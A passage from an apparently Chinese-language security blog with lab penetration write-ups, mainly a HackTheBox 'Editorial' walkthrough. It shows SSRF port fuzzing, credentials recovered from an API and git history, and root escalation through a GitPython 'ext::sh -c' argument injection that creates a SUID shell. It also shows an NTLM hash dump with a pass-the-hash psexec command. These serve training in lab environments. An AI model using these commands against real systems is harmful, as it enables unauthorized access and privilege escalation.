<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc02b7670084dd30471730cc0a1672c:::</span><br><span class="line">cyberweb:1105:aad3b435b51404eeaad3b435b51404ee:2de5cd0f15d1c070851d1044e1d95c90:::</span><br><span class="line">abcc:1106:aad3b435b51404eeaad3b435b51404ee:73f5d97549f033374fa6d9f9ce247ffd:::</span><br><span class="line">WIN-7NRTJO59O7N$:1000:aad3b435b51404eeaad3b435b51404ee:a0cde4eb68e4a2345b888c83eed3b196:::</span><br><span class="line">CYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:fba62b6152431813b79b5e71c41b16d0:::</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 -q python3 psexec.py -hashes :94bd5248e87cb7f2f9b871d40c903927 cyberstrikelab.com/administrator@192.168.20.20</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303173617800.png" class title="image-20250303173617800">

<p>拿到最后的旗帜</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303173712105.png" class title="image-20250303173712105">
]]></content>
      <categories>
        <category>靶机系列</category>
        <category>CyberStrikeLab</category>
      </categories>
      <tags>
        <tag>综合渗透靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox - Editorial</title>
    <url>/2025/03/05/HackTheBox-Editorial/</url>
    <content><![CDATA[<h2 id="外网信息探测："><a href="#外网信息探测：" class="headerlink" title="外网信息探测："></a>外网信息探测：</h2><p><strong>Nmap 服务探测</strong></p>
<p>目标IP 10.10.11.20</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(mighty㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -n -Pn -sS -p- --min-rate 10000 10.10.11.20</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 18:28 CST</span><br><span class="line">Nmap scan report for 10.10.11.20</span><br><span class="line">Host is up (0.48s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT STATE SERVICE</span><br><span class="line">22/tcp open ssh</span><br><span class="line">80/tcp open http</span><br><span class="line"></span><br><span class="line">┌──(mighty㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -sTVC -O -p22,80 10.10.11.20 </span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">| 256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)</span><br><span class="line">|_ 256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)</span><br><span class="line">80/tcp open http nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://editorial.htb</span><br></pre></td></tr></table></figure></div>

<p><strong>Web 服务测试</strong></p>
<p>扫描结果显示80端口重定向到 <code>http://editorial.htb</code>，但 <code>Nmap</code> 无法跟随至该域名，添加域名解析。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br></pre></td></tr></table></figure></div>

<p>访问 <code>http://editorial.htb</code>，首页是一个静态页面，尽管我尝试点击了所有可能的交互点，但程序并没有提供交互功能</p>
<p>接着访问 <code>/upload</code>，提供了一个表单提交的功能</p>
<p>填写表单并发送请求，发现回显了一个图片路径</p>
<p>访问图片路径，是一个错误图片</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021212558110.png" class title="image-20241021212558110">

<p>我在本地监听7788，将表单信息改为本地IP并点击预览，本地接收到了目标发送的HTTP请求，发现 nc 居然接收到了目标服务器的连接</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021212839106.png" class title="image-20241021212839106">

 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021212540182.png" class>

<p> 如果我在本地开启 Python Web 服务，并提供 image.png 图片，目标还会读取图片， 同时网页也显示出读取的图片</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021213912229.png" class title="image-20241021213912229">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021214406645.png" class title="image-20241021214406645">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021213918249.png" class title="image-20241021213918249">

<p> 当我不提供任何图片时，直接让目标访问 Python Web服务根目录，看到对方直接就读取了根目录列表并存在服务器文件中</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021214926014.png" class title="image-20241021214926014">

<p> 目标可以读取任何有效的 URL 内容，很显然这就像我们熟知的漏洞 - SSRF</p>
<h2 id="SSRF内部端口识别："><a href="#SSRF内部端口识别：" class="headerlink" title="SSRF内部端口识别："></a>SSRF内部端口识别：</h2><p>通过该程序提供的 HTTP 请求功能，我尝试判断是否存在<strong>本地无法访问的服务端口</strong></p>
<p>首先将表单信息改为127.0.0.1，端口改为80、22，这是已知的两个端口，分别提交。80端口等待了长时间才返回结果，而22端口立刻就返回了结果，结果仍然回显之前的错误图片</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021215635729.png" class title="image-20241021215635729">

 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021215803803.png" class title="image-20241021215803803">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021215751200.png" class title="image-20241021215751200">

<p>我再次尝试请求一个不存在的端口</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022095339258.png" class title="image-20241022095339258">

<p>和22端口一样很快的返回了结果，同样是之前的错误图片</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022095356826.png" class>

<p><strong>接下来我尝试枚举所有端口。</strong></p>
<p>将 HTTP 请求体中需要替换的内容使用占位符FUZZ替代，并保存在 requests.txt，使用 <code>ffuf</code> 进行SSRF fuzz</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021222128775.png" class>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -u http://editorial.htb/upload-cover -request ssrf.request -w &lt;(seq 0 65535) -ac</span><br></pre></td></tr></table></figure></div>

<p>扫描完毕，结果显示 5000 端口内部开放</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022101049760.png" class title="image-20241022101049760">

<p>5000 端口是一个内部运行的端口，我并不知道它运行的是什么服务</p>
<p>尝试请求 5000 端口，服务器返回了不同的结果</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022095746155.png" class title="image-20241022095746155">

<p>BurpSuite全部放包，不然包被卡住，服务器不会存储读取的信息。</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022100814908.png" class title="image-20241022100814908">

<p>然后读取文件，缓存时间比较短暂，因为有一个自动清理的程序在运行，一会就自动清理了</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022101125499.png" class title="image-20241022101125499">

<p>将文本进行 Json 格式化</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022102238058.png" class title="image-20241022102238058">

<p>服务器特别像 Flask 或 Gunicorn 等框架，根据 Json 信息，推测它可能在运行基于Python 及 Flask 构建的 Web API 应用。这个应用负责处理 HTTP 请求，并响应 JSON 格式的数据，用于处理和管理用户、版本更新等信息，<strong>接下来我尝试去抓取这些API端点信息</strong></p>
<h3 id="API端点信息获取："><a href="#API端点信息获取：" class="headerlink" title="API端点信息获取："></a>API端点信息获取：</h3><p>依次请求各个API</p>
<p><a class="link" href="http://127.0.0.1:5000/api/latest/metadata/messages/coupons">http://127.0.0.1:5000/api/latest/metadata/messages/coupons<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022104448557.png" class title="image-20241022104448557">

<p>&#x2F;api&#x2F;latest&#x2F;metadata&#x2F;messages&#x2F;authors</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022105709117.png" class title="image-20241022105709117">

<p>&#x2F;api&#x2F;latest&#x2F;metadata&#x2F;changelog</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022110151574.png" class title="image-20241022110151574">

<p>在authors中，惊人地发现账户密码泄露，使用 SSH 尝试连接，登录成功</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dev/dev080217_devAPI!@</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022110453419.png" class title="image-20241022110453419">

<h2 id="dev-prod-用户移动："><a href="#dev-prod-用户移动：" class="headerlink" title="dev -&gt; prod 用户移动："></a>dev -&gt; prod 用户移动：</h2><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>对内网进行基础信息枚举</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:~$ sudo -l</span><br><span class="line">[sudo] password for dev: </span><br><span class="line">Sorry, user dev may not run sudo on editorial.</span><br></pre></td></tr></table></figure></div>

<p>列出SUID文件，但并没有可利用提权的文件</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:~$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/libexec/polkit-agent-helper-1</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/fusermount3</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/su</span><br></pre></td></tr></table></figure></div>

<p>系统下存在两个用户，dev、prod</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:~$ cd /home</span><br><span class="line">dev@editorial:/home$ ls</span><br><span class="line">dev  prod</span><br><span class="line">dev@editorial:/home$ ls -liah</span><br><span class="line">total 16K</span><br><span class="line">76438 drwxr-xr-x  4 root root 4.0K Jun  5 14:36 .</span><br><span class="line">    2 drwxr-xr-x 18 root root 4.0K Jun  5 14:54 ..</span><br><span class="line">79764 drwxr-x---  4 dev  dev  4.0K Oct 22 06:52 dev</span><br><span class="line">77643 drwxr-x---  5 prod prod 4.0K Jun  5 14:36 prod</span><br></pre></td></tr></table></figure></div>

<p>我传入<strong>pspy64监控定时任务</strong>，发现服务器定时执行 clear.sh 脚本清理 <code>/static/uploads/.</code> 目录，这也对应了前面调用服务器发送 HTTP 请求读取信息，一会缓存就没了的情况。</p>
<p>可惜该文件是只读文件，无法被普通用户修改</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022115252379.png" class title="image-20241022115252379">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022115654170.png" class title="image-20241022115654170">

<h3 id="Git-历史记录敏感信息收集："><a href="#Git-历史记录敏感信息收集：" class="headerlink" title="Git 历史记录敏感信息收集："></a>Git 历史记录敏感信息收集：</h3><p>dev 用户路径下存在一个 apps 目录</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:/home$ cd ~</span><br><span class="line">dev@editorial:~$ ls -liah</span><br><span class="line">total 36K</span><br><span class="line">79764 drwxr-x--- 4 dev  dev  4.0K Oct 22 06:52 .</span><br><span class="line">76438 drwxr-xr-x 4 root root 4.0K Jun  5 14:36 ..</span><br><span class="line">79704 drwxrwxr-x 3 dev  dev  4.0K Jun  5 14:36 apps</span><br><span class="line">80303 lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -&gt; /dev/null</span><br><span class="line">80301 -rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout</span><br><span class="line">80256 -rw-r--r-- 1 dev  dev  3.7K Jan  6  2022 .bashrc</span><br><span class="line">79703 drwx------ 2 dev  dev  4.0K Jun  5 14:36 .cache</span><br><span class="line">  187 -rw------- 1 dev  dev    20 Oct 22 06:52 .lesshst</span><br><span class="line">80300 -rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile</span><br><span class="line">83829 -rw-r----- 1 root dev    33 Oct 22 04:06 user.txt</span><br></pre></td></tr></table></figure></div>

<p>进入该目录，发现这是一个 <code>git</code> 项目文件夹，<code>.git</code> 目录仍然存在，说明这个项目之前使用了 Git 进行版本控制。然而，当运行 git status 时，Git 显示了项目中的文件都已被删除。</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:~/apps$ ls -liah</span><br><span class="line">total 12K</span><br><span class="line">79704 drwxrwxr-x 3 dev dev 4.0K Jun  5 14:36 .</span><br><span class="line">79764 drwxr-x--- 4 dev dev 4.0K Oct 22 06:52 ..</span><br><span class="line">77696 drwxr-xr-x 8 dev dev 4.0K Oct 22 06:49 .git</span><br><span class="line"></span><br><span class="line">dev@editorial:~/apps$ git status</span><br><span class="line"></span><br><span class="line">On branch master                                                                  </span><br><span class="line">Changes not staged for commit:                                                  </span><br><span class="line">  (use &quot;git add/rm &lt;file&gt;...&quot; to update what will be committed)                   </span><br><span class="line">  (use &quot;git restore &lt;file&gt;...&quot; to discard changes in working directory)        </span><br><span class="line">  </span><br><span class="line">        deleted:    app_api/app.py                                                </span><br><span class="line">        deleted:    app_editorial/app.py                                       </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.css                 </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.css.map              </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.min.css                                         </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.min.css.map                                     </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.rtl.css                                         </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.rtl.css.map                                     </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.rtl.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.rtl.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.rtl.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.rtl.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.rtl.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.rtl.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.rtl.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.rtl.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.rtl.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.rtl.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.rtl.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.rtl.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.rtl.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.rtl.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/images/login-background.jpg</span><br><span class="line">        deleted:    app_editorial/static/images/pexels-janko-ferlic-590493.jpg</span><br><span class="line">        deleted:    app_editorial/static/images/pexels-min-an-694740.jpg</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.bundle.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.bundle.js.map</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.bundle.min.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.bundle.min.js.map</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.esm.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.esm.js.map</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.esm.min.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.esm.min.js.map</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.js.map</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.min.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.min.js.map</span><br><span class="line">        deleted:    app_editorial/templates/about.html</span><br><span class="line">        deleted:    app_editorial/templates/index.html</span><br><span class="line">        deleted:    app_editorial/templates/upload.html</span><br></pre></td></tr></table></figure></div>

<p>Git 是一个分布式版本控制系统，它允许开发者跟踪代码库的变化，并且可以在不同版本之间切换。<code>.git</code> 目录是一个隐藏文件夹，存储了该项目的所有版本历史记录、分支信息、提交记录等。</p>
<p><code>.git</code> 目录通常包含的内容有：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">objects/：存储着项目的所有数据对象，每一个文件的所有版本都存储为对象。</span><br><span class="line">refs/：记录了分支和标签。</span><br><span class="line">config：Git 项目的配置文件。</span><br><span class="line">HEAD：指向当前活动的分支。</span><br></pre></td></tr></table></figure></div>

<p>推测开发者可能删除了项目文件，但忘记了删除 <code>.git</code> 目录，导致版本控制信息还留在系统中。这种情况下，仍然可以通过 <code>.git</code> 恢复被删除的文件或获取有用的敏感信息。</p>
<p>查看之前的提交，寻找敏感信息，有时候开发者可能会在提交历史中留下敏感信息，比如API密钥、数据库密码，甚至是应用程序的凭据。</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:~/apps$ git log --oneline</span><br><span class="line">8ad0f31 (HEAD -&gt; master) fix: bugfix in api port endpoint</span><br><span class="line">dfef9f2 change: remove debug and update api port</span><br><span class="line">b73481b change(api): downgrading prod to dev</span><br><span class="line">1e84a03 feat: create api to editorial info</span><br><span class="line">3251ec9 feat: create editorial app</span><br><span class="line"></span><br><span class="line">//git log --oneline 以简洁的方式展示Git仓库的提交历史，每个提交信息会包含一个提交的哈希值以及提交时的简要描述</span><br></pre></td></tr></table></figure></div>

<p>发现提交记录中，有这样一句 <code>downgrading prod to dev</code>，这句信息表明开发者将 prod 降级为 dev，这有可能存在敏感信息，使用 <code>git diff</code> 查看代码更改的差异，定位具体更改内容</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dev@editorial:~/apps$ git diff 1e84a03 b73481b</span><br><span class="line">diff --git a/app_api/app.py b/app_api/app.py</span><br><span class="line">index 61b786f..3373b14 100644</span><br><span class="line">--- a/app_api/app.py</span><br><span class="line">+++ b/app_api/app.py</span><br><span class="line">@@ -64,7 +64,7 @@ def index():</span><br><span class="line"> @app.route(api_route + &#x27;/authors/message&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line"> def api_mail_new_authors():</span><br><span class="line">     return jsonify(&#123;</span><br><span class="line">-        &#x27;template_mail_message&#x27;: &quot;Welcome to the team! We are thrilled to have you on board and can&#x27;t wait to see the incredible content you&#x27;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#x27;t hesitate to reach out if you have any questions or ideas - we&#x27;re always here to support you.\n\nBest regards, &quot; + api_editorial_name + &quot; Team.&quot;</span><br><span class="line">+        &#x27;template_mail_message&#x27;: &quot;Welcome to the team! We are thrilled to have you on board and can&#x27;t wait to see the incredible content you&#x27;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#x27;t hesitate to reach out if you have any questions or ideas - we&#x27;re always here to support you.\n\nBest regards, &quot; + api_editorial_name + &quot; Team.&quot;</span><br><span class="line">     &#125;) # TODO: replace dev credentials when checks pass</span><br><span class="line"> </span><br><span class="line"> # -------------------------------</span><br></pre></td></tr></table></figure></div>

<p>使用 <code>git diff</code> ，在两次更改的差异中找到了密码信息</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">- Username: prod</span><br><span class="line">- Password: 080217_Producti0n_2023!@</span><br><span class="line">+ Username: dev</span><br><span class="line">+ Password: dev080217_devAPI!@</span><br></pre></td></tr></table></figure></div>

<p>使用账号密码切换 prod 用户</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022173023570.png" class title="image-20241022173023570">

<h2 id="Root-权限提升："><a href="#Root-权限提升：" class="headerlink" title="Root 权限提升："></a>Root 权限提升：</h2><p>从 <code>Dev</code> 用户切换至 <code>Prod</code> 用户，并用 <code>sudo -l </code> 列出用户具有的 <code>sudo</code> 权限，发现具备使用 root 权限运行 <code>clone_prod_change.py</code> 文件的权限</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">prod@editorial:~$ sudo -l</span><br><span class="line">[sudo] password for prod: </span><br><span class="line">Matching Defaults entries for prod on editorial:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User prod may run the following commands on editorial:</span><br><span class="line">    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *</span><br></pre></td></tr></table></figure></div>

<p>查看 <code>/opt/internal_apps/clone_changes/clone_prod_change.py</code> 文件，发现代码使用了 <code>gitpython</code> 库调用 <code>git</code></p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024145910846.png" class title="image-20241024145910846">

<p>发现当前 <code>GitPython</code> 库版本为 3.1.29，低于 3.1.30，这个版本存在 CVE 漏洞</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024145558285.png" class title="image-20241024145558285">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024145825520.png" class title="image-20241024145825520">

<p>根据官方文档，该漏洞受影响的函数是 <code>git.repo.base.Repo.clone_from</code> ，该函数的第一个参数接收一个 URL ，假如对这个参数不做检验直接传给 <code>clone_from</code> 函数，就会造成命令执行漏洞</p>
<p>接下来我给 <code>clone_prod_change.py</code> 文件传入 <code>ext::sh -c touch% /tmp/FuXian</code></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py &quot;ext::sh -c touch% /tmp/FuXian&quot;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024150233332.png" class title="image-20241024150233332">

<p>看到虽然报错，但成功创建了 <code>/tmp/FuXian</code> 目录，漏洞复现成功。</p>
<p><strong>利用该漏洞提权</strong></p>
<p>创建一个bash脚本，将 <code>/bin/sh</code> 复制至 <code>/tmp/a</code> ，给 <code>/tmp/a</code> 文件提升至 root 权限，并赋予 SetUID、SetGID</p>
<p>Setuid（设置用户 ID 位）：当文件具有 setuid 权限时，无论谁执行该文件，该进程将以文件所有者的权限运行。<br>Setgid（设置组 ID 位）：当文件具有 setgid 权限时，无论谁执行该文件，该进程将以文件所属组的权限运行。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">cp /bin/sh /tmp/a</span><br><span class="line">chown root:root /tmp/a</span><br><span class="line">chmod 6777 /tmp/a</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo -e &#x27;#!/bin/bash\n\ncp /bin/sh /tmp/a\nchown root:root /tmp/a\nchmod 6777 /tmp/a&#x27; &gt; /dev/shm/a.sh</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024151528414.png" class title="image-20241024151528414">

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x a.sh</span><br><span class="line">sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py &quot;ext::sh -c touch% /dev/shm/a.sh&quot;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024151936910.png" class title="image-20241024151936910">

<p>执行 <code>/tmp/a</code> ，<code>-p</code> 保留权限，完成 Root 提权</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024152551978.png" class title="image-20241024152551978">





]]></content>
      <categories>
        <category>靶机系列</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>综合渗透靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>CyberStrikeLab-lab2</title>
    <url>/2025/03/07/CyberStrikeLab-lab2/</url>
    <content><![CDATA[<p>目标：公司派遣测试某网络的安全性。目标是成功获取所有服务器的权限，以评估网络安全状况。 </p>
<p><strong>漏洞扫描：</strong></p>
<p>对 192.168.10.* 网段进行扫描，发现 192.168.10.20 可能存在 CVE-2017-12615 历史漏洞，以及 192.168.10.10 74 CMS </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] PocScan http://192.168.10.20:8080 poc-yaml-iis-put-getshell</span><br><span class="line">[+] PocScan http://192.168.10.20:8080 poc-yaml-tomcat-cve-2017-12615-rce</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307210505387.png" class title="image-20250307210505387">



<h2 id="独立工作站-192-168-10-10"><a href="#独立工作站-192-168-10-10" class="headerlink" title="独立工作站 - 192.168.10.10"></a>独立工作站 - 192.168.10.10</h2><p>骑士CMS 渗透，我对 808 端口进行目录扫描，扫描的同时对 Web 页面进行初步观测，尝试寻找 SQL 注入、SSRF 等常规 Web 漏洞，可惜并没有发现有效入口点</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306211540734.png" class title="image-20250306211540734">

<p>常规字典下扫描也没有发现特别信息</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307142941715.png" class title="image-20250307142941715">

<p>渗透并不顺利，我转而在网络检索尝试找到更多线索，在某个官方文档中发现了该 CMS 的通用管理员页面路径</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?m=admin&amp;c=index&amp;a=login</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307141020560.png" class title="image-20250307141020560">

